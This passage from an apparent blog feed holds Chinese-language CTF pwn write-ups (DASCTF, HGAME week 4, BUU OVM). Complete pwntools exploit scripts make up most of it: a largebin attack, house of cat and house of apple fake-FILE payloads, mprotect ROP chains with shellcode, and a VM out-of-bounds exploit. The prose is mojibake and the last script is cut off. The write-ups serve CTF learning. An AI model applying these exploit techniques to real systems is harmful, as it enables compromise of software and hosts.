libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xb0</span> + p64(bss + <span class="hljs-number">0xb0</span>) + p64(<span class="hljs-number">0x40136C</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Now, please say something to DASCTF:&#x27;</span>, payload)<br><br>payload = flat(<br>    p64(pop_rdi), p64(bss - <span class="hljs-number">0xb0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">7</span>),<br>    p64(mprotect),<br>    p64(bss + <span class="hljs-number">0x40</span>)<br>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>payload = payload.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(bss -<span class="hljs-number">8</span>) + p64(leave_ret)<br>p.sendafter(<span class="hljs-string">&#x27;Now, please say something to DASCTF:&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hgame-week4-pwn</title>
    <link href="/2023/02/07/hgame-week4-pwn/"/>
    <url>/2023/02/07/hgame-week4-pwn/</url>
    
    <content type="html"><![CDATA[<h3 id="without-hook"><a href="#without-hook" class="headerlink" title="without_hook"></a>without_hook</h3><p>libcç»™çš„æ˜¯2.36-0ubuntu2_amd64ï¼Œä»¥å‰ä¿®æ”¹<code>__free_hook</code>å’Œ<code>__malloc_hook</code>çš„æ–¹æ³•å°±è¡Œä¸é€šäº†ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°ä½¿ç”¨largebin attackæ”»å‡»å»åŠ«æŒIOæ§åˆ¶æµï¼Œæœ€åæ„é€ house of catæˆ–è€…house of appleçš„<code>fake_IO_FILE</code>ï¼Œå’Œä»¥å‰æˆ‘åšè¿‡<a href="https://xtxtn.github.io/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/#store">å¼ºç½‘æ‹Ÿæ€çš„ä¸€é“é¢˜</a>å¾ˆåƒã€‚</p><p>å”¯ä¸€æœ‰åŒºåˆ«çš„å°±æ˜¯ä»¥å‰å¸¸ç”¨çš„<code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>è¿™ä¸ªgadgetä¼¼ä¹åœ¨è¯¥ç‰ˆæœ¬çš„libcä¸­æ‰¾ä¸åˆ°äº†</p><p><img src="/img/11/Screenshot_20230208_095848.jpg"></p><p>è¿™é‡Œæˆ‘æ”¹ç”¨<code>mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x18]</code>è¿™ä¸ªgadgetï¼Œä½¿ç”¨house of appleå»å®ç°setcontextå‡½æ•°å¯¹rspçš„åŠ«æŒã€‚</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vuln&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./vuln&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">32393</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x500</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x520</span>)<br>show(<span class="hljs-number">0</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">2060528</span><br>IO_list_all = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libcbase  + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>pop_rdx_rbx = libcbase + <span class="hljs-number">0x8bbb9</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23ba5</span><br>pop_rsi = libcbase + <span class="hljs-number">0x251fe</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br>gadget1 = libcbase + <span class="hljs-number">0x164850</span>  <span class="hljs-comment">#mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x18]</span><br>gadget2 = libcbase + <span class="hljs-number">0x10ba6f</span> <span class="hljs-comment">#mov rdx, qword ptr [rax + 0x38] ; call qword ptr [rax + 0x10]</span><br><br><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>edit(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(IO_list_all - <span class="hljs-number">0x20</span>))<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x520</span>)<br><br>fake_addr = heap_addr + <span class="hljs-number">0xcc0</span><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_addr)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x28</span><br>fake_IO_FILE += p64(gadget2)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1b0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>payload = fake_IO_FILE.ljust(<span class="hljs-number">0x1f0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload += flat(<br>    p64(pop_rdi), p64(heap_addr),<br>    p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx_rbx), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>    p64(mprotect),<br>    p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>edit(<span class="hljs-number">2</span>, payload)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="4nswerâ€™s-gift"><a href="#4nswerâ€™s-gift" class="headerlink" title="4nswerâ€™s gift"></a>4nswerâ€™s gift</h3><p>è¿™é“é¢˜ç™½ç»™äº†libcçš„åœ°å€ï¼Œå¹¶ä¸”ç›´æ¥è®©ä½ å»åŠ«æŒIOæ§åˆ¶æµï¼›è™½ç„¶æ²¡æœ‰ç»™å †åœ°å€ï¼Œé¢˜ç›®ç»™äº†æç¤ºLinuxå†…æ ¸ç‰ˆæœ¬ä¸º5.15ï¼Œå½“ç”³è¯·å †å—è¶³å¤Ÿå¤§æ—¶å°±ä¼šç›´æ¥è¿”å›ä¸€å—åœ¨libcä¸Šè¾¹çš„å†…å­˜ï¼Œä¸”åç§»å›ºå®šï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½ç›´æ¥åˆ©ç”¨house of catæˆ–è€…house of appleå®Œæˆæ”»å‡»ã€‚</p><p>â€‹</p><p>house of cat</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vuln&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./vuln&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>,<span class="hljs-number">30252</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>IO_list_all = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>libcbase = IO_list_all - libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;gift?&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x22000</span>).encode())<br><br>fake_addr = libcbase - <span class="hljs-number">0x26000</span> + <span class="hljs-number">0x10</span><br><span class="hljs-comment">#fake_addr = libcbase + 3080192 + 0x10</span><br>fake_IO_FILE = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x400</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1c0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x1c0</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(sys_addr)<br><br>p.sendafter(<span class="hljs-string">b&#x27;gitf?&#x27;</span>, fake_IO_FILE)<br><span class="hljs-comment">#pause()</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹</p><p>house of apple</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;vuln&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./vuln&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30252</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>IO_list_all = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>libcbase = IO_list_all - libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>IO_wfile_jumps = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libcbase  + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>pop_rdx_rbx = libcbase + <span class="hljs-number">0x8bbb9</span><br>pop_rdi = libcbase + <span class="hljs-number">0x23ba5</span><br>pop_rsi = libcbase + <span class="hljs-number">0x251fe</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br>gadget1 = libcbase + <span class="hljs-number">0x164850</span>  <span class="hljs-comment">#mov rax, qword ptr [rdi + 8] ; call qword ptr [rax + 0x18]</span><br>gadget2 = libcbase + <span class="hljs-number">0x10ba6f</span> <span class="hljs-comment">#mov rdx, qword ptr [rax + 0x38] ; call qword ptr [rax + 0x10]</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;gift?&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x22000</span>).encode())<br><br>fake_addr = libcbase - <span class="hljs-number">0x26000</span> + <span class="hljs-number">0x10</span> <span class="hljs-comment">#0x290000 0x380000</span><br><span class="hljs-comment">#fake_addr = libcbase + 3080192 + 0x10</span><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(IO_wfile_jumps)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x28</span><br>fake_IO_FILE += p64(gadget2)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x1c0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>payload = fake_IO_FILE.ljust(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload += flat(<br>p64(pop_rdi), p64(fake_addr - <span class="hljs-number">0x10</span>),<br>p64(pop_rsi), p64(<span class="hljs-number">0x1000</span>),<br>p64(pop_rdx_rbx), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>p64(mprotect),<br>p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br><span class="hljs-comment">#print(hex(libcbase))</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;gitf?&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ€ç§‘CVE-2020-3331</title>
    <link href="/2023/01/12/CVE-2020-3331/"/>
    <url>/2023/01/12/CVE-2020-3331/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buuå¯’å‡ç»ƒä¹ 2</title>
    <link href="/2023/01/07/buu2/"/>
    <url>/2023/01/07/buu2/</url>
    
    <content type="html"><![CDATA[<h3 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h3><p>è¿™é“vmpwné¢˜åˆ†æèµ·æ¥å¹¶ä¸éš¾ï¼Œè¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼Œæœ€é«˜ä½çš„ä¸€å­—èŠ‚å¯¹åº”ç€æŒ‡ä»¤ï¼Œå‰©ä¸‹ä¸‰ä¸ªå­—èŠ‚å°±å¯¹åº”å¯„å­˜å™¨å’Œæ“ä½œæ•°ï¼Œè€Œæ¼æ´ä¹Ÿæ˜¯å¾ˆç»å…¸çš„æ•°ç»„è¶Šç•Œã€‚</p><p>æˆ‘è‡ªå·±åˆšå¼€å§‹å†™çš„æ—¶å€™æ€»æƒ³ç€å…ˆå°†gotè¡¨ä¸­çš„å€¼æ³„æ¼å‡ºæ¥ï¼Œå¾—åˆ°libcçš„åŸºåœ°å€åæ–¹ä¾¿å»å†™å…¥systemå‡½æ•°åœ°å€ï¼Œç¨‹åºè™½ç„¶æä¾›äº†æ‰“å°å¯„å­˜å™¨è¿™ä¸ªæŒ‡ä»¤ï¼Œä½†æ˜¯æ‰“å°åä¼šç«‹é©¬é€€å‡ºexecuteå‡½æ•°ï¼Œè¿™æ ·å°±æ— æ³•è¿›ä¸€æ­¥å»ä¿®æ”¹äº†ï¼›çœ‹åˆ°å…¶ä»–å¤§ä½¬å†™çš„<a href="https://www.cnblogs.com/lemon629/p/13975686.html">wp</a>åæ‰ååº”è¿‡æ¥å¯ä»¥åˆ©ç”¨gotè¡¨ä¸­åœ°å€çš„åç§»åŒæ ·å¯ä»¥å»ä¿®æ”¹ã€‚</p><p>æ”»å‡»æ€è·¯ï¼š</p><ol><li>åˆ©ç”¨æ•°ç»„è¶Šç•Œå¾—åˆ°gotè¡¨ä¸­çš„libcåœ°å€ï¼›</li><li>åˆ©ç”¨è¯¥åœ°å€åŠ æˆ–è€…å‡å»ä¸€æ®µåç§»å¾—åˆ°<code>__free_hook-8</code>çš„åœ°å€ï¼›</li><li>å°†<code>__free_hook-8</code>çš„åœ°å€å†™å…¥å…¨å±€å˜é‡commentä¸­ï¼›</li><li>é€€å‡ºexecuteå‡½æ•°æ‰“å°å¯„å­˜å™¨çš„å€¼ï¼Œå¯ä»¥å¾—åˆ°libcçš„åŸºåœ°å€ï¼Œåˆ©ç”¨ç¨‹åºæœ€åä¼šå‘commentä¸­çš„åœ°å€å†™å…¥å€¼å’Œfreeè¯¥åœ°å€çš„ç‰¹ç‚¹ï¼Œå†™å…¥å­—ç¬¦ä¸²â€œ&#x2F;bin&#x2F;shâ€å’Œsystemå‡½æ•°åœ°å€ã€‚</li></ol><p>â€‹</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn1&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc6_2.23-0ubuntu10_amd64.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25875</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendcode</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-keyword">if</span> num &gt; <span class="hljs-number">0x7fffffff</span> :<br>        num = <span class="hljs-number">0xffffffff</span> - num + <span class="hljs-number">1</span><br>        num = <span class="hljs-built_in">str</span>(num)<br>        num = <span class="hljs-string">&#x27;-&#x27;</span>+num<br>    <span class="hljs-keyword">else</span> :<br>        num = <span class="hljs-built_in">str</span>(num)<br>    <span class="hljs-keyword">return</span> num.encode()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;PCPC:&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;SP:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;CODE SIZE:&#x27;</span>, <span class="hljs-string">b&#x27;20&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;CODE:&#x27;</span>)<br><br>p.sendline(sendcode(<span class="hljs-number">0x10000038</span>))    <span class="hljs-comment">#reg0 = 0x38</span><br>p.sendline(sendcode(<span class="hljs-number">0x80010200</span>))    <span class="hljs-comment">#reg1 = reg2 - reg0</span><br>p.sendline(sendcode(<span class="hljs-number">0x30040001</span>))    <span class="hljs-comment">#reg4 = memory[reg1]</span><br>p.sendline(sendcode(<span class="hljs-number">0x10000001</span>))    <span class="hljs-comment">#reg0 = 